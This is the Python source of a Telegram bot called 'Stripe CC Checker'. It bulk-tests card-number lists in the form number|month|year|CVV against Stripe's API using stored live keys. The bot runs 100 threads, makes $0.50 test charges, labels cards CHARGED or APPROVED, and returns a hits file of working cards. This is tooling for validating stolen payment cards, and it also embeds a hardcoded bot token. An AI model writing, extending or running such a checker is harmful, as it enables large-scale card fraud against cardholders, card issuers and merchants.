import os
import re
import io
import time
import json
import random
import threading
import requests
import telebot
from telebot import types
from concurrent.futures import ThreadPoolExecutor, as_completed

# ==================== CONFIG ====================
BOT_TOKEN = "9060670628:AAHbvvffgyA95w_r6OHF7lW7NtdX0jbMRug"
ADMIN_ID = 6566026385
CREDIT = "@ZYELEO"

KEY_FILE = "stripe_keys.json"
MAX_THREADS = 100 

bot = telebot.TeleBot(BOT_TOKEN)

# ==================== STATE ====================
def load_keys():
    if os.path.exists(KEY_FILE):
        try:
            with open(KEY_FILE, 'r') as f: return json.load(f)
        except: pass
    return {"pk": [], "sk": []}

def save_keys(keys):
    with open(KEY_FILE, 'w') as f: json.dump(keys, f, indent=4)

STRIPE_KEYS = load_keys()
user_states = {}

# ==================== STRIPE ENGINE ====================
def check_card_stripe(combo, key, key_type):
    url = "https://api.stripe.com/v1/payment_intents" if key_type == "sk" else "https://api.stripe.com/v1/tokens"
    headers = {
        "Authorization": f"Bearer {key}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    
    parts = combo.split("|")
    if len(parts) != 4: return combo, "ERROR", "Invalid Format"
    cc, mm, yy, cvv = parts
    
    payload = {
        "card[number]": cc,
        "card[exp_month]": mm,
        "card[exp_year]": yy,
        "card[cvc]": cvv
    }
    
    if key_type == "sk":
        payload["amount"] = "50"
        payload["currency"] = "usd"
        payload["payment_method"] = "pm_card_visa" 
        payload["confirm"] = "true"
    
    try:
        r = requests.post(url, headers=headers, data=payload, timeout=20)
        res = r.json()
        
        if "error" in res:
            code = res["error"].get("code", "").lower()
            msg = res["error"].get("message", "").lower()
            
            if "raw card data" in msg or "unsafe" in msg: return combo, "ERROR", "PK Disabled"
            if "invalid api key" in msg: return combo, "ERROR", "Dead Key"
            if code == "incorrect_number": return combo, "DECLINED", "Incorrect Number"
            if code == "invalid_expiry_year": return combo, "DECLINED", "Invalid Expiry"
            if code == "invalid_expiry_month": return combo, "DECLINED", "Invalid Expiry"
            if code == "expired_card": return combo, "DECLINED", "Expired Card"
            if code == "incorrect_cvc": return combo, "DECLINED", "Incorrect CVC"
            if code == "insufficient_funds": return combo, "APPROVED", "Insufficient Funds"
            if code == "card_declined": return combo, "DECLINED", "Card Declined"
            
            return combo, "DECLINED", code or "Declined"
            
        elif "id" in res:
            if key_type == "sk" and res.get("status") == "succeeded":
                return combo, "CHARGED", "Charged $0.50"
            return combo, "APPROVED", "Token Created"
            
        return combo, "ERROR", "Unknown"
    except Exception as e:
        return combo, "ERROR", "Timeout"

# ==================== BOT MENUS ====================
def main_menu():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("🔑 Add Key", callback_data="add_key"),
        types.InlineKeyboardButton("📜 List Keys", callback_data="list_keys"),
        types.InlineKeyboardButton("🧹 Clear Keys", callback_data="clear_keys")
    )
    return markup

@bot.message_handler(commands=['start'])
def start(message):
    text = (
        "💳 **Stripe CC Checker**\n\n"
        "**How to Use:**\n"
        "• `/chk cc|mm|yy|cvv` → Check single\n"
        "• Reply to a `.txt` file with `/chk` → Bulk check (Max 20MB)\n\n"
        "**Admin:** Add your PK or SK keys below."
    )
    bot.reply_to(message, text, reply_markup=main_menu(), parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def callback(call):
    global STRIPE_KEYS
    if call.from_user.id != ADMIN_ID: return

    if call.data == "add_key":
        user_states[call.from_user.id] = "awaiting_key"
        bot.edit_message_text("🔑 Send your `sk_live_...` or `pk_live_...` key:", call.message.chat.id, call.message.message_id)
    elif call.data == "list_keys":
        text = f"📜 **Keys:**\nPKs: `{len(STRIPE_KEYS['pk'])}`\nSKs: `{len(STRIPE_KEYS['sk'])}`"
        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=main_menu(), parse_mode='Markdown')
    elif call.data == "clear_keys":
        STRIPE_KEYS = {"pk": [], "sk": []}
        save_keys(STRIPE_KEYS)
        bot.answer_callback_query(call.id, "✅ All keys cleared!")
        bot.edit_message_text("🗑 Keys cleared.", call.message.chat.id, call.message.message_id, reply_markup=main_menu())

@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == "awaiting_key")
def add_key_input(message):
    uid = message.from_user.id
    user_states[uid] = None
    key = message.text.strip()
    
    if key.startswith("sk_"):
        STRIPE_KEYS["sk"].append(key)
        save_keys(STRIPE_KEYS)
        bot.reply_to(message, "✅ SK Key added.", reply_markup=main_menu())
    elif key.startswith("pk_"):
        STRIPE_KEYS["pk"].append(key)
        save_keys(STRIPE_KEYS)
        bot.reply_to(message, "✅ PK Key added.", reply_markup=main_menu())
    else:
        bot.reply_to(message, "❌ Invalid key format. Must start with sk_ or pk_.")

# ==================== CHECKER ====================
@bot.message_handler(commands=['chk'])
def handle_chk(message):
    if not STRIPE_KEYS["sk"] and not STRIPE_KEYS["pk"]:
        bot.reply_to(message, "❌ No keys added.")
        return

    # Bulk check via reply
    if message.reply_to_message and message.reply_to_message.document:
        doc = message.reply_to_message.document
        
        if doc.file_size > 20 * 1024 * 1024:
            bot.reply_to(message, "❌ File > 20MB. Telegram Bot API limit.")
            return

        msg = bot.reply_to(message, "⏳ Downloading file...")
        try:
            file_info = bot.get_file(doc.file_id)
            content = bot.download_file(file_info.file_path).decode('utf-8', errors='ignore')
            combos = [line.strip() for line in content.splitlines() if len(line.split('|')) == 4]
            
            if not combos:
                bot.edit_message_text("❌ No valid combos found. Format: `cc|mm|yy|cvv`", msg.chat.id, msg.message_id)
                return
                
            bot.edit_message_text(f"🚀 Checking **{len(combos):,}** cards with {MAX_THREADS} threads...", msg.chat.id, msg.message_id, parse_mode='Markdown')
            threading.Thread(target=bulk_worker, args=(msg, combos)).start()
        except Exception as e:
            bot.edit_message_text(f"❌ Error: {e}", msg.chat.id, msg.message_id)
        return

    # Single check
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2: return
    combo = parts[1].strip()
    
    if STRIPE_KEYS["sk"]:
        key = random.choice(STRIPE_KEYS["sk"])
        k_type = "sk"
    else:
        key = random.choice(STRIPE_KEYS["pk"])
        k_type = "pk"
        
    msg = bot.reply_to(message, "🔍 Checking...")
    _, status, reason = check_card_stripe(combo, key, k_type)
    
    emoji = "✅" if status == "CHARGED" else ("🔥" if status == "APPROVED" else "❌")
    bot.edit_message_text(f"{emoji} **{status}**\n💳 `{combo}`\n📝 {reason}", msg.chat.id, msg.message_id, parse_mode='Markdown')

# ==================== BULK WORKER (100 THREADS) ====================
def bulk_worker(msg, combos):
    total = len(combos)
    checked = 0
    hits = 0
    hits_file = io.StringIO()
    start_time = time.time()
    last_update = time.time()
    lock = threading.Lock()

    def check_one(combo):
        nonlocal checked, hits
        if STRIPE_KEYS["sk"]:
            key = random.choice(STRIPE_KEYS["sk"])
            k_type = "sk"
        else:
            key = random.choice(STRIPE_KEYS["pk"])
            k_type = "pk"
            
        _, status, reason = check_card_stripe(combo, key, k_type)
        
        with lock:
            checked += 1
            if status in ("CHARGED", "APPROVED"):
                hits += 1
                hits_file.write(f"{combo} | {status} | {reason}\n")

    def update_progress():
        nonlocal last_update
        if time.time() - last_update > 2 or checked == total:
            last_update = time.time()
            pct = int((checked / total) * 100)
            cpm = int(checked / ((time.time() - start_time) / 60)) if time.time() > start_time else 0
            text = f"🚀 **Checking...**\n\nProgress: `{checked}/{total}` ({pct}%)\n✅ Hits: `{hits}`\n⚡ Speed: `{cpm} CPM`"
            try: bot.edit_message_text(text, msg.chat.id, msg.message_id, parse_mode='Markdown')
            except: pass

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as pool:
        futures = [pool.submit(check_one, c) for c in combos]
        for f in as_completed(futures):
            if checked % 10 == 0:
                update_progress()

    update_progress()
    bot.send_message(msg.chat.id, f"✅ **Done!**\nTotal: `{total}`\nHits: `{hits}`")
    
    if hits > 0:
        hits_file.seek(0)
        bot.send_document(msg.chat.id, ("hits.txt", hits_file.getvalue().encode()), caption=f"🔥 {hits} Hits")

if __name__ == "__main__":
    print("Starting Stripe Bot...")
    bot.infinity_polling()
